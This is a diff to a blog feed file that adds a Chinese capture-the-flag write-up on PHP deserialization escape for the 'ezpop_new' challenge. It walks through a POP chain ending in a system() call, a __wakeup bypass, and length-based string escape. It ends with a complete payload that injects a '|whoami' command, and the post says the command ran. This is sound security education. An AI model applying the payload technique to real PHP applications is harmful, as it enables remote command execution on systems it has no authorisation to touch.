@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>一道题目看php反序列化逃逸</title>
+    <link href="/2022/07/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/2022/07/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[<p>——————原题出自2022强国杯ezpop_new</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/1.png"></p><p>通过本地复现题目，观察几个类和定义的函数，PingUtils类中存在可执行命令的system函数，应该是pop链最后一环，再看定义的filter函数使用preg_replace将数组中的字符替换成nonono，但替换前后字符长短不一，判断考点是php反序列化逃逸</p><p>经过代码审计初步推断出调用顺序:</p><p>Alice-&gt;Bob-&gt;Cindy-&gt;PingUtils</p><p>在Bob类中存在if判定，flag为真才可能去调用Cindy，而__wakeup方法在调用该类时将flag赋值为false，所以这里还涉及到一个wakeup方法的绕过，让序列化后的属性个数的值大于真实个数即可</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/2.png"></p><p>先来构造一个简单的pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alice</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;c=<span class="hljs-variable">$c</span>;<br>  &#125;<br>&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bob</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=<span class="hljs-literal">True</span>;<br>    &#125;<br><br> <span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> Alice(<span class="hljs-keyword">new</span> Bob));<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;</code></p><p>成功调用了Bob并绕过了wakeup方法</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/3.png"></p><p>然后再细看Bob类中的操作，首先cindy变量实例化了一个cindy类,cindy类的someone通过request方法提交，phone被定义。然后经过filter函数替换字符后调用cindy的call方法</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/4.png"></p><p>我们先改一行代码提交一个someone把filter过滤后的序列化数据输出来方便思考后续逃逸</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/5.png"></p><p>someone可控，在此处构造反序列化的逃逸，cindy的phone变量要改成PingUtils类，从而能够访问到PingUtils的call方法。同时PingUtils的call方法接收到someone的字符带入到system中执行。</p><p>按照这个思路我们再把代码中phone改成new PingUtils看一下生成的序列化数据是什么样</p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/6.png"></p><p>可以看到someone后的字符是这些:</p><p><code>&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p><p>一共是35个字符，要使这35个字符逃逸出去就要在filter函数替换的时候多出35个位置，一个flag替换成nonono多出两个位置，一个fopen替换成nonono多出1个位置，共需要17个flag字符和一个fopen字符，使用管道符拼接whoami命令测试(windows环境)</p><p>payload:</p><p><code>?pop=O:5:%22Alice%22:1:&#123;s:1:%22c%22;O:3:%22Bob%22:2:&#123;s:4:%22flag%22;b:1;&#125;&#125;&amp;someone=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagfopen|whoami&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p><p><img src="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96img/7.png"></p><p>成功执行</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>pearcmd.php在文件包含中的应用</title>
     <link href="/2022/06/26/pearcmd/"/>
     <url>/2022/06/26/pearcmd/</url>
